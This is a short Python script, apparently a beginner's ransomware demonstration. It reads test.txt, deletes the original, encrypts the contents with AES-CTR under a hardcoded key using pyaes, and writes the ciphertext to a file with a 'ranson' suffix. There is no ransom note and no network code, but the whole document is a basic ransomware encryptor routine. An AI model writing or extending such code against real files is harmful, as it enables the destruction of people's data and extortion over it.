import os 
import pyaes


file = open("test.txt", "rb")
file_data = file.read()
file.close()

os.remove("test.txt")

key = b"Key who you want"
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file = "test.txt" + "ranson"
new_file = open(f"{new_file}", "wb")
new_file.write(crypto_data)
new_file.close()
